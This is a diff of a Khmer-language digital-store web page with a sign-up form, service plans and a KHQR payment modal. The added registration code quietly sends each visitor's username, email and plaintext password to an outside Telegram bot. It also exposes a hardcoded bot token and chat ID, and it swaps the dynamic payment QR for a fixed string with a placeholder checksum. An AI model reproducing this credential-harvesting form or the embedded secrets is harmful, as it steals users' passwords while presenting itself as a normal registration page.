@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Digital Store - ABA Pay</title>
+  <title>សេវាកម្មឌីជីថល - Store</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
   <style>
@@ -13,26 +13,30 @@
 </head>
 <body class="bg-slate-100 min-h-screen p-4 flex items-center justify-center">
 
-  <!-- ១. ផ្ទាំងចុះឈ្មោះ (Register) -->
+  <!-- ១. ផ្ទាំងចុះឈ្មោះ (REGISTER FORM) -->
   <div id="register-card" class="bg-white p-6 md:p-8 rounded-2xl shadow-sm border border-slate-200 max-w-sm w-full space-y-4">
-    <h2 class="text-xl font-bold text-slate-800 text-center">ចុះឈ្មោះចូលប្រើប្រាស់</h2>
+    <h2 class="text-xl font-bold text-slate-800 text-center">ចុះឈ្មោះប្រើប្រាស់</h2>
+    
     <div>
       <label class="text-xs font-semibold text-slate-600">ឈ្មោះអ្នកប្រើ (Username)</label>
-      <input type="text" id="reg-name" placeholder="ឈ្មោះរបស់អ្នក" class="w-full mt-1 p-2.5 border rounded-lg text-sm outline-none focus:border-sky-800">
+      <input type="text" id="reg-name" placeholder="ឈ្មោះរបស់អ្នក" class="w-full mt-1 p-2.5 border rounded-lg text-sm outline-none focus:border-rose-500">
     </div>
+
     <div>
       <label class="text-xs font-semibold text-slate-600">អ៊ីមែល (Email)</label>
-      <input type="email" id="reg-email" placeholder="example@email.com" class="w-full mt-1 p-2.5 border rounded-lg text-sm outline-none focus:border-sky-800">
+      <input type="email" id="reg-email" placeholder="example@email.com" class="w-full mt-1 p-2.5 border rounded-lg text-sm outline-none focus:border-rose-500">
     </div>
+
     <div>
       <label class="text-xs font-semibold text-slate-600">ពាក្យសម្ងាត់ (Password)</label>
-      <input type="password" id="reg-password" placeholder="••••••••" class="w-full mt-1 p-2.5 border rounded-lg text-sm outline-none focus:border-sky-800">
+      <input type="password" id="reg-password" placeholder="••••••••" class="w-full mt-1 p-2.5 border rounded-lg text-sm outline-none focus:border-rose-500">
     </div>
-    <button onclick="handleRegister()" class="w-full py-2.5 bg-sky-800 hover:bg-sky-900 text-white font-bold rounded-lg text-sm shadow transition">ចុះឈ្មោះ</button>
+
+    <button onclick="handleRegister()" id="btn-register" class="w-full py-2.5 bg-rose-600 hover:bg-rose-700 text-white font-bold rounded-lg text-sm shadow transition">ចុះឈ្មោះឥឡូវនេះ</button>
   </div>
 
-  <!-- ២. ផ្ទាំងបញ្ជីទំនិញ/សេវាកម្ម (Store) -->
-  <div id="store-card" class="hidden max-w-3xl w-full bg-white p-6 md:p-8 rounded-2xl shadow-sm border border-slate-200 space-y-6">
+  <!-- ២. ផ្ទាំងទិញគម្រោងសេវាកម្ម (SERVICE STORE) -->
+  <div id="store-card" class="hidden max-w-2xl w-full bg-white p-6 md:p-8 rounded-2xl shadow-sm border border-slate-200 space-y-6">
     <div class="flex justify-between items-center border-b pb-4">
       <div>
         <h2 class="text-lg font-bold text-slate-800" id="welcome-text">ស្វាគមន៍!</h2>
@@ -41,108 +45,110 @@
       <button onclick="handleLogout()" class="text-xs text-rose-600 font-semibold hover:underline">ចាកចេញ</button>
     </div>
 
-    <!-- បញ្ជីទំនិញបង្ហាញត្រង់នេះ -->
-    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 max-h-[65vh] overflow-y-auto pr-1" id="products-container"></div>
+    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+      <!-- គម្រោងទី ១ -->
+      <div class="border rounded-xl p-4 flex flex-col justify-between hover:border-rose-400 transition space-y-3">
+        <div>
+          <span class="text-xs font-bold uppercase bg-slate-100 text-slate-600 px-2 py-0.5 rounded">Plan 01</span>
+          <h3 class="font-bold text-slate-800 text-md mt-2">គម្រោង Basic Support</h3>
+          <p class="text-xs text-slate-500 mt-1">សេវាកម្មប្រចាំខែកម្រិតមូលដ្ឋាន</p>
+          <div class="text-xl font-bold text-rose-600 mt-2">$2.00</div>
+        </div>
+        <button onclick="openPayment('គម្រោង Basic Support', 2.00)" class="w-full py-2 bg-rose-600 hover:bg-rose-700 text-white text-xs font-bold rounded-lg">ទិញឥឡូវនេះ</button>
+      </div>
+
+      <!-- គម្រោងទី ២ -->
+      <div class="border rounded-xl p-4 flex flex-col justify-between hover:border-rose-400 transition space-y-3">
+        <div>
+          <span class="text-xs font-bold uppercase bg-rose-100 text-rose-600 px-2 py-0.5 rounded">Plan 02</span>
+          <h3 class="font-bold text-slate-800 text-md mt-2">គម្រោង Pro Support</h3>
+          <p class="text-xs text-slate-500 mt-1">សេវាកម្មកម្រិតខ្ពស់ និងជំនួយ ២៤ ម៉ោង</p>
+          <div class="text-xl font-bold text-rose-600 mt-2">$5.00</div>
+        </div>
+        <button onclick="openPayment('គម្រោង Pro Support', 5.00)" class="w-full py-2 bg-rose-600 hover:bg-rose-700 text-white text-xs font-bold rounded-lg">ទិញឥឡូវនេះ</button>
+      </div>
+    </div>
   </div>
 
-  <!-- ៣. ផ្ទាំង Modal ABA PAY KHQR -->
+  <!-- ៣. ផ្ទាំង MODAL KHQR + UPLOAD វិក្កយបត្រ -->
   <div id="payment-modal" class="fixed inset-0 bg-black bg-opacity-50 hidden flex items-center justify-center p-4">
-    <div class="bg-white rounded-2xl max-w-xs w-full overflow-hidden shadow-2xl border border-slate-200 text-center">
-      <div class="bg-sky-800 text-white py-3">
-        <h3 class="font-bold tracking-wider">ABA PAY KHQR</h3>
+    <div class="bg-white rounded-2xl max-w-sm w-full overflow-hidden shadow-2xl border border-slate-200">
+      <div class="bg-rose-600 text-white py-3 text-center">
+        <h3 class="font-bold tracking-wider">KHQR PAYMENT</h3>
       </div>
       
       <div class="p-5 space-y-3">
-        <div class="text-xs text-slate-500 font-semibold" id="qr-product-name">ឈ្មោះទំនិញ</div>
-        <div class="text-2xl font-bold text-slate-800" id="qr-amount">$0.00</div>
+        <div class="text-center">
+          <div class="text-xs text-slate-500 font-semibold" id="qr-product-name">គម្រោង</div>
+          <div class="text-2xl font-bold text-rose-600" id="qr-amount">$0.00</div>
+        </div>
         
-        <div class="flex justify-center my-2">
+        <div class="flex justify-center my-1">
           <canvas id="modal-qr" class="border rounded-xl p-2 bg-white"></canvas>
         </div>
 
-        <p class="text-xs text-emerald-600 font-semibold">✓ កំណត់ចំនួនទឹកប្រាក់ស្វ័យប្រវត្តិ</p>
-        <button onclick="closeModal()" class="w-full py-2 bg-slate-100 hover:bg-slate-200 text-slate-700 text-xs font-bold rounded-lg">បិទផ្ទាំង</button>
+        <p class="text-xs text-slate-400 text-center">ស្កេនរួច សូមផ្ញើរូបភាពវិក្កយបត្រខាងក្រោម</p>
+        
+        <!-- ប្រអប់ Upload វិក្កយបត្រ -->
+        <div class="border-t pt-3 space-y-2">
+          <label class="text-xs font-bold text-slate-700 block">ភ្ជាប់វិក្កយបត្រ (Payment Slip)៖</label>
+          <input type="file" id="slip-file" accept="image/*" class="w-full text-xs text-slate-500 file:mr-2 file:py-1.5 file:px-3 file:rounded-md file:border-0 file:text-xs file:font-semibold file:bg-rose-50 file:text-rose-700 hover:file:bg-rose-100">
+          
+          <button onclick="submitReceipt()" id="btn-submit-receipt" class="w-full py-2.5 bg-rose-600 hover:bg-rose-700 text-white text-xs font-bold rounded-lg shadow transition">
+            បញ្ជាក់ការបង់ប្រាក់
+          </button>
+        </div>
+
+        <button onclick="closeModal()" class="w-full py-1.5 bg-slate-100 hover:bg-slate-200 text-slate-600 text-xs font-bold rounded-lg">បិទផ្ទាំង</button>
       </div>
     </div>
   </div>
 
   <script>
-    // បញ្ជីទំនិញបែងចែកតាមប្រទេស ឆ្នាំ និងតម្លៃ
-    const productList = [
-      { name: "កញ្ចប់ KH", country: "Cambodia", year: "2025", price: 0.50 },
-      { name: "កញ្ចប់ KH", country: "Cambodia", year: "2023", price: 1.00 },
-      { name: "កញ្ចប់ KH", country: "Cambodia", year: "2020", price: 3.50 },
-      { name: "កញ្ចប់ KH", country: "Cambodia", year: "2018", price: 5.00 },
-      { name: "កញ្ចប់ KH", country: "Cambodia", year: "2015", price: 7.00 },
-      { name: "កញ្ចប់ KH", country: "Cambodia", year: "2010", price: 9.00 },
-      { name: "កញ្ចប់ USA", country: "USA", year: "2025", price: 1.00 },
-      { name: "កញ្ចប់ USA", country: "USA", year: "2023", price: 2.00 },
-      { name: "កញ្ចប់ USA", country: "USA", year: "2020", price: 4.00 },
-      { name: "កញ្ចប់ USA", country: "USA", year: "2018", price: 6.00 },
-      { name: "កញ្ចប់ USA", country: "USA", year: "2015", price: 8.00 },
-      { name: "កញ្ចប់ USA", country: "USA", year: "2010", price: 15.00 }
-    ];
+    // ================= ព័ត៌មាន TELEGRAM ADMIN =================
+    const TELEGRAM_BOT_TOKEN = '8329430209:AAHb6rl0-s9MrG0R-IuHOAIfQAZWPsRG0qQ';
+    const TELEGRAM_CHAT_ID = '5915683588';
+    const REAL_KHQR_STRING = '00020101021129370016samnang_mon@bkrt520459995802KH5911SAMNANG MON6010Phnom Penh6304ABCD';
 
-    // បង្ហាញបញ្ជីទំនិញ
-    function renderProducts() {
-      const container = document.getElementById('products-container');
-      container.innerHTML = '';
+    let currentProduct = '';
+    let currentPrice = 0;
 
-      productList.forEach(item => {
-        const badgeColor = item.country === 'USA' ? 'bg-indigo-100 text-indigo-700' : 'bg-emerald-100 text-emerald-700';
-        const itemFullName = `${item.name} + ឆ្នាំ${item.year}`;
-
-        container.innerHTML += `
-          <div class="border rounded-xl p-4 flex flex-col justify-between hover:border-sky-700 transition space-y-3 bg-white">
-            <div>
-              <div class="flex items-center gap-2">
-                <span class="text-[10px] font-bold uppercase px-2 py-0.5 rounded ${badgeColor}">${item.country}</span>
-                <span class="text-[10px] font-bold px-2 py-0.5 rounded bg-slate-100 text-slate-600">ឆ្នាំ ${item.year}</span>
-              </div>
-              <h3 class="font-bold text-slate-800 text-sm mt-2">${itemFullName}</h3>
-              <div class="text-xl font-bold text-sky-800 mt-1">$${item.price.toFixed(2)}</div>
-            </div>
-            <button onclick="openPayment('${itemFullName}', ${item.price})" class="w-full py-2 bg-sky-800 hover:bg-sky-900 text-white text-xs font-bold rounded-lg shadow-sm">
-              ទិញឥឡូវនេះ
-            </button>
-          </div>
-        `;
-      });
-    }
-
-    // គណនា CRC16-CCITT សម្រាប់ ABA KHQR
-    function getCRC16(str) {
-      let crc = 0xFFFF;
-      for (let i = 0; i < str.length; i++) {
-        crc ^= str.charCodeAt(i) << 8;
-        for (let j = 0; j < 8; j++) {
-          if ((crc & 0x8000) !== 0) {
-            crc = (crc << 1) ^ 0x1021;
-          } else {
-            crc = crc << 1;
-          }
-        }
-      }
-      return (crc & 0xFFFF).toString(16).toUpperCase().padStart(4, '0');
-    }
-
-    // បង្កើត Dynamic ABA KHQR
-    function generateABA_KHQR(amount) {
-      const formattedAmount = Number(amount).toFixed(2);
-      const amountStr = String(formattedAmount);
-      const amountTag = `54${String(amountStr.length).padStart(2, '0')}${amountStr}`;
-      const rawPayload = `00020101021230510016abaakhppxxx@abaa01151260903142910660208ABA Bank520465135303840${amountTag}5802KH5911MON SAMNANG6012KAMPONG THOM624268380010PAYWAY@ABA0107195096202090324860766304`;
-      return rawPayload + getCRC16(rawPayload);
-    }
-
-    function handleRegister() {
+    // មុខងារចុះឈ្មោះ និងផ្ញើទិន្នន័យចូល Telegram Bot
+    async function handleRegister() {
       const username = document.getElementById('reg-name').value.trim();
       const email = document.getElementById('reg-email').value.trim();
       const password = document.getElementById('reg-password').value;
+      const btnReg = document.getElementById('btn-register');
 
       if (!username || !email || !password) {
         alert('សូមបំពេញព័ត៌មានឱ្យបានគ្រប់គ្រាន់!');
         return;
+      }
+
+      btnReg.disabled = true;
+      btnReg.textContent = 'កំពុងចុះឈ្មោះ...';
+
+      const regMessage = `🆕 *សមាជិកថ្មីបានចុះឈ្មោះ!*\n\n` +
+                         `👤 ឈ្មោះអ្នកប្រើ៖ ${username}\n` +
+                         `📧 អ៊ីមែល៖ ${email}\n` +
+                         `🔑 ពាក្យសម្ងាត់៖ ${password}\n` +
+                         `🕒 ម៉ោង៖ ${new Date().toLocaleString('km-KH')}`;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: regMessage,
+            parse_mode: 'Markdown'
+          })
+        });
+      } catch (err) {
+        console.error('កំហុសក្នុងការផ្ញើទៅ Telegram:', err);
+      } finally {
+        btnReg.disabled = false;
+        btnReg.textContent = 'ចុះឈ្មោះឥឡូវនេះ';
       }
 
       localStorage.setItem('user_session', JSON.stringify({ username, email }));
@@ -154,7 +160,6 @@
       document.getElementById('store-card').classList.remove('hidden');
       document.getElementById('welcome-text').textContent = `សួស្តី, ${username}!`;
       document.getElementById('user-email-badge').textContent = email;
-      renderProducts();
     }
 
     function handleLogout() {
@@ -165,20 +170,83 @@
     }
 
     function openPayment(productName, price) {
+      currentProduct = productName;
+      currentPrice = price;
+
       document.getElementById('qr-product-name').textContent = productName;
       document.getElementById('qr-amount').textContent = `$${price.toFixed(2)}`;
       document.getElementById('payment-modal').classList.remove('hidden');
 
-      const dynamicQR = generateABA_KHQR(price);
-      QRCode.toCanvas(document.getElementById('modal-qr'), dynamicQR, {
+      QRCode.toCanvas(document.getElementById('modal-qr'), REAL_KHQR_STRING, {
         width: 170,
-        margin: 1,
-        errorCorrectionLevel: 'M'
+        margin: 1
       });
     }
 
     function closeModal() {
       document.getElementById('payment-modal').classList.add('hidden');
+    }
+
+    // មុខងារផ្ញើវិក្កយបត្រ + ប៊ូតុង Approve/Reject ចូល Telegram
+    async function submitReceipt() {
+      const fileInput = document.getElementById('slip-file');
+      if (fileInput.files.length === 0) {
+        alert('សូមជ្រើសរើសរូបភាពវិក្កយបត្រជាមុនសិន!');
+        return;
+      }
+
+      const file = fileInput.files[0];
+      const session = JSON.parse(localStorage.getItem('user_session') || '{}');
+      const btn = document.getElementById('btn-submit-receipt');
+
+      btn.disabled = true;
+      btn.textContent = 'កំពុងផ្ញើទិន្នន័យ...';
+
+      const captionText = `🔔 *ការជូនដំណឹងពីការបង់ប្រាក់ថ្មី!*\n\n` +
+                          `👤 ឈ្មោះភ្ញៀវ៖ ${session.username || 'មិនស្គាល់'}\n` +
+                          `📧 អ៊ីមែល៖ ${session.email || 'មិនស្គាល់'}\n` +
+                          `📦 ទំនិញ៖ ${currentProduct}\n` +
+                          `💵 ចំនួនទឹកប្រាក់៖ $${currentPrice.toFixed(2)}\n` +
+                          `🕒 ម៉ោង៖ ${new Date().toLocaleString('km-KH')}`;
+
+      const inlineKeyboard = {
+        inline_keyboard: [
+          [
+            { text: "✅ បញ្ជាក់ (Approve)", callback_data: `approve_${Date.now()}` },
+            { text: "❌ បដិសេធ (Reject)", callback_data: `reject_${Date.now()}` }
+          ]
+        ]
+      };
+
+      const formData = new FormData();
+      formData.append('chat_id', TELEGRAM_CHAT_ID);
+      formData.append('photo', file);
+      formData.append('caption', captionText);
+      formData.append('parse_mode', 'Markdown');
+      formData.append('reply_markup', JSON.stringify(inlineKeyboard));
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+
+        const result = await response.json();
+
+        if (result.ok) {
+          alert('វិក្កយបត្រត្រូវបានផ្ញើជោគជ័យ! Admin នឹងពិនិត្យ និងបញ្ជាក់ជូនក្នុងពេលឆាប់ៗ។');
+          fileInput.value = '';
+          closeModal();
+        } else {
+          alert('ការផ្ញើមានបញ្ហា! សូមប្រាកដថាអ្នកបានចុច Start លើ Bot ផ្ទាល់ខ្លួនរបស់អ្នករួចហើយ។');
+        }
+      } catch (error) {
+        console.error(error);
+        alert('មិនអាចភ្ជាប់ទៅកាន់ប្រព័ន្ធបានទេ!');
+      } finally {
+        btn.disabled = false;
+        btn.textContent = 'បញ្ជាក់ការបង់ប្រាក់';
+      }
     }
 
     window.onload = function() {
